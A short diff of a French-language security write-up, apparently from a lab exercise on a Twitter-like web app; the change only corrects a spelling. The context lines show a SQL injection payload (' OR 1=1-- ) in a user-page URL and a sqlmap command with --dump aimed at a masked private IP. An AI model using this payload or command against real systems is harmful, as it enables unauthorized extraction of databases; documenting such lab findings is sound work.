@@ -50,7 +50,7 @@ Lorsque que l'on accede à la page des tweets postés par un user,l'url "http://
 Par exemple, l'ajout de " 'OR 1=1-- " permet d'afficher tous les tweets disponible dans la base de données
  => cela nous indique que des commandes SQL ou SQLite (en l'occurennce) est possible. 
  
- Si l'on oubli la discretion, un sqlmap de cette url permet de remonter l'ensemble des données dans la BDD. 
+ Si l'on oublie la discretion, un sqlmap de cette url permet de remonter l'ensemble des données dans la BDD. 
  
 ````
  sqlmap -u "http://192.168.XXX.XXX/user?id=X" --dump
